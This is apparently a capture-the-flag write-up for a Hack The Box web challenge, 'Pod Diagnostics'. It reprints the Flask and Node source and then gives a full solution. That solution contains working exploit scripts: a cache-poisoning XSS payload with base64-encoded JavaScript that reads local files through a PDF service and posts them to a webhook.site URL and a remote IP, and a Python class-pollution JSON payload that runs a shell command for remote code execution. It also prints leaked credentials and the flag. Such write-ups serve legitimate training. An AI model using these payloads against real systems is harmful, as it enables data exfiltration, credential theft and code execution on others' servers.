# Web

## Description

We've discovered a mining pod tunnelling underneath a government facility. Luckily, we've managed to connect to an air-gapped control panel that was seemingly left enabled. Can you exploit it and help us track down the perpetrator controlling it?
## Source

`entrypoint.sh`
```bash
#!/bin/bash
# Secure entrypoint
chmod 600 /entrypoint.sh

# Populate admin and session secret env
echo "ENGINEER_USERNAME=engineer" > /app/services/web/.env
echo "ENGINEER_PASSWORD=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)" >> /app/services/web/.env
chown www-data:www-data /app/services/web/.env

/usr/bin/supervisord -c /etc/supervisord.conf
```

`/challenge/web/auth.py`
```python
from functools import wraps
from flask import g, request, redirect, url_for, make_response, abort, render_template
import base64
import os

engineer_username = os.environ.get("ENGINEER_USERNAME")
engineer_password = os.environ.get("ENGINEER_PASSWORD")

if engineer_username is None or engineer_password is None:
    print("Missing engineer username and password, shutting down...")
    exit()

class AuthenticationException(Exception):
    pass

def auth_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        try:
            header_value = request.headers.get("Authorization")

            if header_value is None:
                raise AuthenticationException("No Authorization header")

            if not header_value.startswith("Basic "):
                raise AuthenticationException("Only Basic auth supported")
            
            _, encoded_auth = header_value.split(" ")

            decoded_auth = base64.b64decode(encoded_auth).decode()

            username, password = decoded_auth.split(":")

            if username != engineer_username or password != engineer_password:
                raise AuthenticationException("Invalid username and password")

            return f(*args, **kwargs)
        except AuthenticationException as e:
            response = make_response(render_template("error.html", status_code=401, error_message="Engineers Only!"), 401)
            response.headers["WWW-Authenticate"] = 'Basic realm="Engineer Portal"'
            return response

    return decorated_function
```

`/challenge/web/main.py`
```python
import io
import os
from urllib.parse import quote

from dotenv import load_dotenv
from flask import Flask, abort, jsonify, render_template, request, send_file
from werkzeug.exceptions import HTTPException
import requests

load_dotenv()

from auth import auth_required
from report import Report, fetch_reports

app = Flask(__name__)

system_version = "v1.0"
pdf_generation_URL = "http://127.0.0.1:3002"

is_generating_report = False

@app.route("/")
def stats_handler():
    return render_template("index.html", reports=fetch_reports(), system_version=system_version)

@app.route("/generate-report")
def generate_report_handler():
    global is_generating_report

    if is_generating_report:
        abort(422)
    
    is_generating_report = True

    try:
        pdf_response = requests.get(f"{pdf_generation_URL}/generate?url={quote('http://localhost/')}")

        if pdf_response is None or pdf_response.status_code != 200:
            is_generating_report = False
            abort(pdf_response.status_code)

        is_generating_report = False
        return send_file(
            io.BytesIO(pdf_response.content), 
            mimetype="application/json", 
            as_attachment=True,
            download_name="report.pdf"
        )
    except:
        is_generating_report = False
        abort(pdf_response.status_code)

@app.route("/report", defaults={"report_id": None}, methods=["GET"])
@app.route("/report/<report_id>", methods=["GET"])
@auth_required
def report_handler(report_id):
    title = ""
    description = ""

    try:
        report = Report(report_id)

        title = report.title
        description = report.description
    except:
        abort(404)

    return render_template("report.html", report=report, title=title, description=description)

@app.route("/report", defaults={"report_id": None}, methods=["POST"])
@app.route("/report/<report_id>", methods=["POST"])
@auth_required
def submit_report_handler(report_id):
    request_data = request.json

    if "title" not in request_data or "description" not in request_data:
        return jsonify({ "success": False, "error": "Missing parameters!"})

    report = Report(report_id)
    report.update(request_data)

    return jsonify({"success": True, "report_id": str(report)})

@app.errorhandler(HTTPException)
def http_error_handler(error):
    return render_template("error.html", status_code=error.code)

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=3000)
```

`/challenge/web/main.py`
```python
import os
import json
import uuid
import datetime
from jinja2 import Template

report_store = os.environ.get("REPORT_STORE", "./reports")

if not os.path.exists(report_store):
    os.mkdir(report_store)

def fetch_reports():
    reports = []

    for report_name in os.listdir(report_store):
        reports.append(Report(report_name.replace(".json", "")))

    return reports

def merge(source, destination):
    for key, value in source.items():
        if hasattr(destination, "get"):
            if destination.get(key) and type(value) == dict:
                merge(value, destination.get(key))
            else:
                destination[key] = value
        elif hasattr(destination, key) and type(value) == dict:
            merge(value, getattr(destination, key))
        else:
            setattr(destination, key, value)

def get_date():
    return datetime.datetime.now().strftime("%y/%m/%d %H:%M:%S")

class Report:
    def __init__(self, report_id = None):
        if report_id is not None and not os.path.exists(os.path.join(report_store, report_id + ".json")):
            raise Exception("Report could not be found")
        
        self.id = (report_id if report_id else str(uuid.uuid4()))
        self.title = ""
        self.description = ""
        self.updated_at = get_date()

        self.file_name = self.id + ".json"
        self.file_path = os.path.join(report_store, self.file_name)

        if os.path.exists(self.file_path):
            with open(self.file_path) as report_file:
                self.update(json.load(report_file), save=False)
        else:
            self.save()

    def __str__(self):
        return "POD-REPORT-" + self.id

    def render(self):
        template = Template("""<div>
          <h4><a href="/report/{{report.id}}">{{report.title}}</a></h4>
          <p>{{report.description}}</p>
          <p>Last updated: {{report.updated_at}}</p>
        </div>""")

        return template.render(report=self)

    def update(self, data, save=True):
        merge(data, self)

        if save:
            self.updated_at = get_date()
            self.save()

    def as_dict(self):
        return { 
            "title": self.title,
            "description": self.description,
            "updated_at": self.updated_at
        }

    def save(self):
        with open(self.file_path, "w") as report_file:
            json.dump(self.as_dict(), report_file)
```

`challenge/stats/index.js`
```js
const express = require("express");
const getStats = require("./stats");

const app = express();
const port = 3001;

app.use((req, res, next) => {
  res.set("Access-Control-Allow-Origin", "*");
  next();
});

const validPeriods = { "1m": 60_000, "5m": 300_000, "10m": 600_000 };
const statStore = [];

app.get("/stats", async (req, res) => {
  const { period } = req.query;

  if (!period || !validPeriods.hasOwnProperty(period)) {
    return res.json({
      success: false,
      error: `<strong>${period} is invalid.</strong> Please specify one of the following values: ${Object.keys(validPeriods).join(", ")}`,
    });
  }

  const periodData = statStore.filter((result) => result.takenAt < new Date().getTime() + validPeriods[period]);
  const averageData = periodData.reduce(
    (acc, curr) => {
      acc.memoryUsage += curr.memoryUsage;
      acc.cpuUsage += curr.cpuUsage;
      acc.diskUsage += curr.diskUsage;
      return acc;
    },
    { memoryUsage: 0, cpuUsage: 0, diskUsage: 0 }
  );

  averageData.memoryUsage /= periodData.length;
  averageData.cpuUsage /= periodData.length;
  averageData.diskUsage /= periodData.length;

  return res.json({
    success: true,
    current: await getStats(),
    average: averageData,
  });
});

app.listen(port, () => {
  console.log(`System statistic server listening at http://localhost:${port}`);

  // Collect stats every 30 seconds
  setInterval(async () => {
    const stats = await getStats();

    if (!stats) return;

    statStore.push(stats);
  }, 30_000);
});
```

`challenge/pdf/index.js`
```js
const express = require("express");
const generatePDF = require("./pdf");

const app = express();
const port = 3002;

app.use((req, res, next) => {
  res.set("Access-Control-Allow-Origin", "*");
  next();
});

app.get("/generate", async (req, res) => {
  const { url } = req.query;

  if (!url) return res.sendStatus(400);

  const pdf = await generatePDF(url);

  if (!pdf) return res.sendStatus(500);

  res.contentType("application/pdf");
  res.end(pdf);
});

app.listen(port, () => {
  console.log(`PDF generation server listening at http://localhost:${port}`);
});
```


## Solution

![pod-diagnostics.png](/assets/ctf/htb/web/pod-diagnostics.png)

The applications displays the server statistics and updates every 30 seconds. We can download the diagnostics, but not really useful as we got what we see.

Index handler renders diagnostics and reports that have been submitted.
```python
@app.route("/")
def stats_handler():
    return render_template("index.html", reports=fetch_reports(), system_version=system_version)
```

Report generation send request to port `3002` where PDF webapp lives, generates PDF and sends it. 
```python
@app.route("/generate-report")
def generate_report_handler():
```

`main.py` contains 2 other methods, but both need authentication.
```python
@app.route("/report", defaults={"report_id": None}, methods=["GET"])
@app.route("/report/<report_id>", methods=["GET"])
@auth_required
def report_handler(report_id):
...
@app.route("/report", defaults={"report_id": None}, methods=["POST"])
@app.route("/report/<report_id>", methods=["POST"])
@auth_required
def submit_report_handler(report_id):
```

Authentication is based on `Authorization` header. I think this rules our XSS, but CSRF is valid attack vector.
```python
def auth_required(f):
	...
	header_value = request.headers.get("Authorization")
	_, encoded_auth = header_value.split(" ")
	decoded_auth = base64.b64decode(encoded_auth).decode()
	username, password = decoded_auth.split(":")
	if username != engineer_username or password != engineer_password:
		raise AuthenticationException("Invalid username and password")
	...
```

So............. what are we supposed to do?? Well obviously we can't steal anything if we don't control any variables, but `nginx` configuration did have something interesting in it.

There's caching functionality enabled, which could be dangerous.
```bash
proxy_cache_path /run/nginx/cache keys_zone=stat_cache:10m inactive=10s;

server {
	location = /stats {
		proxy_cache stat_cache;
		proxy_cache_key "$arg_period";
		proxy_cache_valid 200 15s;

		proxy_pass http://127.0.0.1:3001;
	}
```

The stats has an endpoint that returns main diagnostics on the page
```js
app.get("/stats", async (req, res) => {
  const { period } = req.query;

  if (!period || !validPeriods.hasOwnProperty(period)) {
    return res.json({
      success: false,
      error: `<strong>${period} is invalid.</strong> Please specify one of the following values: ${Object.keys(validPeriods).join(", ")}`,
    });
  }
```

`proxy_cache_key "$arg_period";` passes the query argument `period` to the proxy.

If we add another `period` to the params something unexpected happens, the next url is cached and previous results are returned.
```bash
└─$ curl 'http://10.0.2.15:1337/stats?period=5m'
{"success":true,"current":{"takenAt":1727120327100,"uptime":"19:38:47 up 18:16,  0 users,  load average: 0.12, 0.15, 0.17","memoryUsage":85.80056444993109,"cpuUsage":4.2608052371312155,"diskUsage":65},"average":{"memoryUsage":85.02820906672372,"cpuUsage":4.270197689589738,"diskUsage":65}}                                                                                                                                   
└─$ curl 'http://10.0.2.15:1337/stats?period=TestValue'
{"success":false,"error":"<strong>TestValue is invalid.</strong> Please specify one of the following values: 1m, 5m, 10m"}                                                                                        
└─$ curl 'http://10.0.2.15:1337/stats?period=5m'
{"success":true,"current":{"takenAt":1727120338390,"uptime":"19:38:58 up 18:17,  0 users,  load average: 0.10, 0.14, 0.17","memoryUsage":85.90525873619224,"cpuUsage":4.261093290389262,"diskUsage":65},"average":{"memoryUsage":85.02820906672372,"cpuUsage":4.270197689589738,"diskUsage":65}}                                                                                                                                    
└─$ curl 'http://10.0.2.15:1337/stats?period[]=TestVal'
{"success":false,"error":"<strong>TestVal is invalid.</strong> Please specify one of the following values: 1m, 5m, 10m"}                                                                                          
└─$ curl 'http://10.0.2.15:1337/stats?period=5m'
{"success":true,"current":{"takenAt":1727120355488,"uptime":"19:39:15 up 18:17,  0 users,  load average: 0.08, 0.13, 0.17","memoryUsage":85.85008548962885,"cpuUsage":4.26161487810014,"diskUsage":65},"average":{"memoryUsage":85.04423195959626,"cpuUsage":4.2700369808032255,"diskUsage":65}}                                                                                                                                    
└─$ curl 'http://10.0.2.15:1337/stats?period=5m&period=TestVal'
{"success":false,"error":"<strong>5m,TestVal is invalid.</strong> Please specify one of the following values: 1m, 5m, 10m"}                                                                                       
└─$ curl 'http://10.0.2.15:1337/stats?period=5m'
{"success":false,"error":"<strong>5m,TestVal is invalid.</strong> Please specify one of the following values: 1m, 5m, 10m"} 
```

![pod-diagnostics-1.png](/assets/ctf/htb/web/pod-diagnostics-1.png)

We are able to inject HTML into the page which opens up XSS/CSRF vectors.

We can trigger the XSS via generating report, because the main website is visited which is cached and poison by us we get to inject anything. Another important thing to mind is that we need to poison `1m` interval, as that's the default value when loading page.

![pod-diagnostics-2.png](/assets/ctf/htb/web/pod-diagnostics-2.png)

```python
import requests
from base64 import b64encode as be

URL = "http://localhost:1337"
JS = '''
const C2 = 'https://webhook.site/57b66e9e-66f3-4328-85b8-2d1090fec6e9';
const PDF_APP = 'http://localhost:3002';
const FILE_TO_INCLUDE = '/etc/passwd';

function blobToBase64(blob) {
    return new Promise((resolve, _) => {
        const reader = new FileReader();
        reader.onloadend = () => resolve(reader.result.split(',')[1]);
        reader.readAsDataURL(blob);
    });
}

function log(string) { fetch(`${C2}/?${string}`, { mode: 'no-cors' }); }

(async () => {
    // log('Starting...');
    const pdf_response = await fetch(`${PDF_APP}/generate?url=file://${FILE_TO_INCLUDE}`);
    const pdf_blob = await pdf_response.blob();
    // log('Got_the_PDF...');

    const pdf_blob_gzip = pdf_blob.stream().pipeThrough(new CompressionStream('gzip'));
    let pdf_blob_gzip_chunks = [];
    for await (const chunk of pdf_blob_gzip) pdf_blob_gzip_chunks.push(chunk);
    pdf_blob_gzip_chunks = new Blob(pdf_blob_gzip_chunks);
    // log('Converted_to_gzip...')

    const pdf_blob_gzip_base64 = await blobToBase64(pdf_blob_gzip_chunks);
    // log('Converted_to_base64...')

    fetch(C2, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({data: pdf_blob_gzip_base64}),
      mode: 'no-cors'
    })
    // log('Done...')
})();
'''.strip()
# with open('exploit.js') as f: JS=f.read()
XSS = '<img src=x onerror="eval(atob(`{}`))" />'.format(be(JS.encode()).decode())

with requests.Session() as session:
    session.proxies = {'http': 'http://localhost:8080'}

    params = {'period': ['1m', XSS]}
    resp = session.get(f"{URL}/stats", params=params)
    print(resp.json()['success'])

    resp = session.get(f"{URL}/generate-report")
    print(resp)
```

[CyberChef Recipe](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Gunzip())

![pod-diagnostics-3.png](/assets/ctf/htb/web/pod-diagnostics-3.png)

`/flag` is readable? even through intended way is probably to use `/readflag` binary to read the file.

![pod-diagnostics-4.png](/assets/ctf/htb/web/pod-diagnostics-4.png)

Sidetracking, but sometime around I just got tired of copy pasting blobs and downloading files. I tried using Pipedream but I got limited from testing... Well why not deploy your own server??

Oracle offers Always Free machines, which is more then enough to handle all CTF shenaniganry, [https://www.oracle.com/cloud/free/](https://www.oracle.com/cloud/free/).

![pod-diagnostics-5.png](/assets/ctf/htb/web/pod-diagnostics-5.png)

Update the PoC script, because `It works on my machine` problem.
```python
import requests
from base64 import b64encode as be

URL = "http://83.136.255.235:47563"
JS = '''
let C2 = 'http://140.238.172.167';
 // C2 = 'http://10.0.2.15:8000';
const PDF_APP = 'http://localhost:3002';
const FILE_TO_INCLUDE = '/app/services/web/.env';

function blobToBase64(blob) {
    return new Promise((resolve, _) => {
        const reader = new FileReader();
        reader.onloadend = () => resolve(reader.result.split(',')[1]);
        reader.readAsDataURL(blob);
    });
}

function log(string) { fetch(`${C2}/?${string}`, { mode: 'no-cors' }); }

(async () => {
    // log('Starting...');
    const pdf_response = await fetch(`${PDF_APP}/generate?url=file://${FILE_TO_INCLUDE}`);
    const pdf_blob = await pdf_response.blob();
    // log('Got_the_PDF...');

    const pdf_blob_gzip = pdf_blob.stream().pipeThrough(new CompressionStream('gzip'));
    // log('Got_the_gzip_blob...')
 
    let pdf_blob_gzip_chunks = [];
    try {
        const reader = pdf_blob_gzip.getReader();
        while (true) {
            const { value, done } = await reader.read();
            if (done) {
                // log('Stream reading is done.');
                break;
            }
            // log('Got chunk: ' + value);
            pdf_blob_gzip_chunks.push(value);
        }
    } catch (err) {
        // log('Error reading stream: ' + err);
    }
    pdf_blob_gzip_chunks = new Blob(pdf_blob_gzip_chunks);
    // log('Converted_to_gzip...')

    const pdf_blob_gzip_base64 = await blobToBase64(pdf_blob_gzip_chunks);
    // log('Converted_to_base64...')

    const formData = new FormData();
    formData.append('data', pdf_blob_gzip_base64);
    fetch(`${C2}/data`, {
      method: 'POST',
      body: formData,
    })
    // log('Done...')
})();
'''.strip()
XSS = '<img src=x onerror="eval(atob(`{}`))" />'.format(be(JS.encode()).decode())

with requests.Session() as session:
    session.proxies = {'http': 'http://localhost:8080'}

    params = {'period': ['1m', XSS]}
    resp = session.get(f"{URL}/stats", params=params)
    print(resp.json())

    resp = session.get(f"{URL}/generate-report")
    print(resp)
```

Create simple application to handle the decoding: 
```python
from datetime import datetime
from flask import Flask, jsonify, render_template_string, request, send_from_directory
from gzip import GzipFile
from io import BytesIO
from uuid import uuid4
from pathlib import Path
import base64
import pdfplumber

UPLOADS = Path('./reports')
UPLOADS.mkdir(exist_ok=True, parents=True)

app = Flask(__name__)

@app.route('/')
def index():
    folders = {}
    for folder in UPLOADS.glob('*'):
        print(folder)
        if not folder.is_file():
            files = [file.relative_to(folder) for file in folder.glob('*')]
            folders[folder.relative_to(UPLOADS)] = files

    return render_template_string('''
        <h1>Reports</h1>
        <ul>
            {% for folder, files in folders.items() %}
                <li>{{ folder }}
                    <ul>
                        {% for file in files %}
                            <li><a href="/download/{{ folder }}/{{ file }}">{{ file }}</a></li>
                        {% endfor %}
                    </ul>
                </li>
            {% endfor %}
        </ul>
    ''', folders=folders)


@app.route('/data', methods=['POST'])
def decode_data():
    data_base64 = request.form.get('data')
    if not data_base64:
        return jsonify({'data': 'Error, no data recieved'})

    data_base64 += '=' * (-len(data_base64) % 4)  # Adjust padding
    data_compressed = base64.b64decode(data_base64)
    with GzipFile(fileobj=BytesIO(data_compressed)) as f:
        data_decompressed = f.read()

    folder = get_upload_folder()
    with open(get_upload_filename(folder, 'pdf'), 'wb') as out:
        out.write(data_decompressed)

    text = pdf_to_text(data_decompressed)
    with open(get_upload_filename(folder, 'txt'), 'w') as out:
        out.write(text)

    return jsonify({'data': text})


@app.route('/download/<folder>/<filename>')
def download(folder, filename):
    return send_from_directory(UPLOADS / folder, filename)


def pdf_to_text(pdf_content):
    with pdfplumber.open(BytesIO(pdf_content)) as pdf:
        text = ''.join(
            page.extract_text() + "\n"
            for page in pdf.pages
        )
    return text


def get_upload_folder():
    name = str(datetime.now()).split('.')[0].replace(' ', 'T')
    path = UPLOADS / name
    path.mkdir(exist_ok=True, parents=True)
    return path


def get_upload_filename(folder: Path, extension: str):
    name = f'{uuid4()}.{extension}'
    path = (folder / name).absolute()
    return path


if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8000)
```

Anyways, the `report.py` has some suspicious code usage. 

`merge` function is famous for [Class Pollution (Python's Prototype Pollution)](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution)
```python
def merge(source, destination):
    for key, value in source.items():
        if hasattr(destination, "get"):
            if destination.get(key) and type(value) == dict:
                merge(value, destination.get(key))
            else:
                destination[key] = value
        elif hasattr(destination, key) and type(value) == dict:
            merge(value, getattr(destination, key))
        else:
            setattr(destination, key, value)
```

The render method is also suspicious. The Template is generated from string and report is populating the values. [SSTI (Server Side Template Injection)](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#what-is-ssti-server-side-template-injection)
```python
class Report:
	...
    def render(self):
        template = Template("""<div>
          <h4><a href="/report/{{report.id}}">{{report.title}}</a></h4>
          <p>{{report.description}}</p>
          <p>Last updated: {{report.updated_at}}</p>
        </div>""")

        return template.render(report=self)

    def update(self, data, save=True):
        merge(data, self)
	...
```

We can achieve RCE from Class Pollution: [https://www.offensiveweb.com/docs/programming/python/class-pollution/](https://www.offensiveweb.com/docs/programming/python/class-pollution/)
```json
{
    "title": "x",
    "description": "y",
    "__init__": {
        "__globals__": {
            "__loader__": {
                "__init__": {
                    "__globals__": {
                        "sys": {
                            "modules": {
                                "jinja2": {
                                    "runtime": {
                                        "exported": [
                                            "*;__import__('os').system('/readflag > /app/services/web/static/flag.txt');#"
                                        ]
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
```

But first we need to login. Using the XSS PoC script read the `.env` file which is holding the credentials.

```bash
ENGINEER_USERNAME=engineer
ENGINEER_PASSWORD=3mtCMVZ2nrdHzUNPRWoGAKWik7zDJeyJ
```

Login, submit report, catch it in burp, edit the request with above JSON which will run `/readflag` and place it in `static` folder.

Get the flag: [http://83.136.255.235:47563/static/flag.txt](http://83.136.255.235:47563/static/flag.txt)

> Flag: `HTB{P011ut1ng_tH3_p0D5_Py1h0n_pr0gr4ms}`

---

References:
- <https://cyber-man.pl/HTB-Pod-Diagnostics-web>
- <https://www.freebuf.com/articles/web/377828.html>
- <https://www-freebuf-com.translate.goog/articles/web/377828.html?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=en&_x_tr_pto=wapp&_x_tr_hist=true>
